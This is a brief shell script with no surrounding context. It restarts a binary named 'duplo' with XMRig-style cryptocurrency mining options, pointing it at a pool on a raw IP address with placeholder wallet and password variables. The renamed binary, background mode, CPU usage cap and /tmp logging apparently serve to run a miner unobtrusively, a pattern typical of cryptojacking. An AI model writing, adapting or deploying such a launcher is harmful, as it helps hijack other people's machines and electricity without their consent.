pkill duplo
sleep 7
duplo -o 95.216.137.218:55885 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=80 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=55 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/duplo/duplo.log'
